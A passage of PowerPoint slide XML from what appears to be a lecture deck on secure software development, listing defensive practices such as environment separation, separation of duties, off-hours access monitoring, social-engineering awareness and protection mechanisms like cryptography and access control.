            <a:pPr marL="1257300" lvl="1" indent="-342900">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Handle errors and exceptions</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1257300" lvl="1" indent="-342900">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Update and patch regularly</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1257300" lvl="1" indent="-342900">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Regular Security Testing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1257300" lvl="1" indent="-342900">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Secure Configuration</a:t>
            </a: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8755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78C14-D77A-2C68-FF2E-C90DA0515B1E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="720000" y="445025"/>
            <a:ext cx="8032114" cy="572700"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2800" dirty="0"/>
              <a:t>Application design &amp; development security</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F9DFA0EA-ABCB-5D51-DBE8-7004778C090E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="720000" y="1215750"/>
            <a:ext cx="7704000" cy="3758184"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>It refers to the practices and principles applied during the creation of software applications to ensure that they are secure from potential threats and vulnerabilities. It encompasses all phases of the software development lifecycle (SDLC), from initial design through to deployment and maintenance. Here are some key aspects of application design and development security:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="1" indent="-28575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Secure Architecture Design</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="1" indent="-28575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Secure Coding Practices</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="1" indent="-28575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Authentication and Authorization</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="1" indent="-28575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Data Protection</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="1" indent="-28575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Security Testing</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="1" indent="-28575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Patch Management and Updates</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="1" indent="-28575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Secure Deployment and Configuration</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="35329022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3FA4F-3B42-17FA-4353-54C13AF991B4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Environment and controls</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{ACD97BB7-FB49-0EBE-083B-F87FCF9C9939}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:ea typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>It refers to the processes, configurations, and protective measures applied to the various environments (development, testing, staging, production) where an application is built, tested, and deployed. These controls ensure that each environment is secure, stable, and consistent, thereby minimizing risks and vulnerabilities.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="1" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Security of the environment</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="1" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Physical and logical separation of duties</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="1" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Separation of production and development environment</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="1" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Retention of key personnel/knowledge</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="1" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Documentation of programs/systems/errors handling</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="1" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Security and monitoring of off hours access</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="1" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Preventing social engineering</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0">
              <a:ea typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="38820183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0801245-1308-AE7B-8A0C-7B94096F390A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="720000" y="304800"/>
            <a:ext cx="7704000" cy="4299150"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>1. Security of the Environment: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Ensuring that the physical and digital environments where systems run are protected from threats.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Examples:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    Firewalls, antivirus, intrusion detection systems</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    Secure data centers (with locks, surveillance, limited access)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    Encryption of data in transit and at rest</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    Patch management and vulnerability scanning</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>2. Physical and Logical Separation of Duties: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>No single person should have control over all parts of a process to reduce the risk of fraud or errors.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Examples:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    A developer writes code, but a separate team deploys it.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    A database admin can maintain databases, but not modify application logic.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Physical separation: Different teams in different locations</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Logical separation: Role-based access control (RBAC), system permissions</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="23773183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D1217-6ACF-6E0E-8ED2-63AF88281B3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61B4471-812E-6A56-DDDB-A972A29B3FBE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="720000" y="304800"/>
            <a:ext cx="7704000" cy="4299150"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>3. Separation of Production and Development Environments: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Prevents bugs, test code, or malicious changes in development from affecting the live system.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Best practices:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    Dev/test servers separate from production</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    No real customer data in development</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    Only approved code is deployed to production</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>4. Retention of Key Personnel/Knowledge: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Ensuring important technical and procedural knowledge isn’t lost when key staff leave.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Strategies:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    Cross-training team members</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    Maintaining updated documentation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    Succession planning for critical roles</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="32729280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FCEE9-F8ED-655F-C8A1-0A93296CAE6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599A823-9397-46A6-D408-DCAB7E617939}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="720000" y="304800"/>
            <a:ext cx="7704000" cy="4299150"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>5. Documentation of Programs/Systems/Error Handling:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>Benefits:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>    Faster troubleshooting</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>    Easier onboarding of new team members</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>    Compliance and auditing support</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>6. Security and Monitoring of Off-Hours Access: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>Controlling and monitoring who accesses systems during nights, weekends, or holidays.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>Measures:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>    Time-based access control</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>    Logging and reviewing off-hours logins</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>    Alerting for unusual activity</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>7. Preventing Social Engineering:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>Common social engineering attacks:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>    Phishing emails</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>    Fake IT support calls</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0"/>
              <a:t>    Pretexting (pretending to be someone trustworthy)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3508082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41EC2-6E0D-80A9-2ED6-F32AE903C6BD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685587" y="317205"/>
            <a:ext cx="7704000" cy="572700"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>Essence of secure software development</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{272187A6-ACF3-E5D7-ED50-0F9F32CD132E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="319549" y="1017725"/>
            <a:ext cx="8593394" cy="4026223"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1700" dirty="0"/>
              <a:t>Additional software protection mechanisms include:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="4254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Cryptography (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>confidentiality, integrity, and authenticity</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="4254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Access controls (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Authentication, Authorization, and Accountability </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="4254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Validation of external components (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>third-party software, libraries, and APIs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="4254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Backup</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>R</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>edundancy controls (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Hardware Redundancy, Software/Service Redundancy, Data Redundancy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="4254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Training</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="4254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Transaction controls </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(Atomicity (transactions are all-or-nothing), Logging and audit trails, Integrity checks)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="4254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Testing and evaluation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="4254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Mobile code controls</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="4254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 contamination controls (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Unit &amp; integration testing , Penetration testing, Security audits &amp; certifications</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="19732262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1F56D-E435-9A7C-FB02-052D9A3A4ADB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Secure Coding Practices</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1227821D-DF64-6198-763B-75B275D56215}"/>
              </a:ext>
            </a:extLst>
